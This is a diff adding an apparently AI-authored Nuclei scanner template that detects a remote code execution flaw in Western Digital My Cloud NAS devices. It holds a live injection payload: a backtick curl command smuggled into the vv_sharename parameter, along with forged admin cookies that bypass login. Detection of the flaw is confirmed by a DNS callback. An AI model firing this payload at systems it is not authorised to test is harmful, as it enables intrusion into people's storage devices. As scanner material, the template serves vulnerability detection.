@@ -1,0 +1,28 @@
+id: western-digital-my-cloud-chk-vv-rce
+info:
+  name: Western Digital My Cloud NAS chk_vv_sharename.php Remote Code Execution
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: rce,dnslog
+
+variables:
+  interactsh_url: "{{interactsh-url}}"
+
+http:
+  - raw:
+      - |
+        GET /web/php/chk_vv_sharename.php?vv_sharename=`curl+{{interactsh_url}}` HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: username=admin; isAdmin=1
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "<config><res>0</res></config>"
+
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
